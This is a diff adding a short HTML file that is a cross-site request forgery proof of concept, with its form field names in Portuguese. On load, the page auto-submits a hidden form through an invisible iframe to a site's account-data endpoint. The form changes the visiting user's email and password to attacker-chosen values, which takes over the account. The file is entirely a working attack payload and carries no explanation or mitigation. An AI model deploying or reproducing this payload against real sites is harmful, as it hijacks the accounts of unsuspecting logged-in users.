@@ -1,0 +1,16 @@
+<!-- csrf-com-iframe.html -->
+<html>
+  <body>
+    <iframe name="csrfFrame" style="display: none;"></iframe>
+
+    <form id="csrfForm" action="https://www.site.com/api/site/meus-dados" method="POST" target="csrfFrame" enctype="multipart/form-data">
+      <input type="hidden" name="acao" value="site/meus-dados">
+      <input type="hidden" name="email" value="alterado@invisivel.com">
+      <input type="hidden" name="senha" value="Invisivel456!">
+    </form>
+
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
